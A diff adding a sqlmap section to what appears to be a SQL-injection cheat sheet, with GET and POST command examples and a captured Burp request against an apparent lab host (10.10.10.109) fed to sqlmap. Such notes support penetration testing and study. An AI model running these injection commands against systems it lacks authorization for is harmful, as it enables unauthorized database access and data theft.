@@ -1,4 +1,5 @@
 * [`sqlmap`](#sqlmap)
+  * [get request](#get-request)
 * [INFORMATION_SCHEMA](#information_schema)
   * [INFORMATION_SCHEMA Tables](#information_schema-tables)
 * [Manual Methods](#manual-methods)
@@ -10,6 +11,34 @@
   * [show data](#show-data)
 
 # `sqlmap`
+## get request
+```
+sqlmap -u "http://example.com/?a=1&b=2&c=3" -p "a,b"
+```
+## post request
+```
+sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST
+```
+Alternatively, copy the POST request in the intercept of burpsuite in a file and use it as follows
+```
+$ cat web.txt
+POST /results.php HTTP/1.1
+Host: 10.10.10.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.109/search.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+search=killer
+```
+```
+sqlmap -r web.txt -p "search"
+```
 
 # INFORMATION_SCHEMA
 Refs:
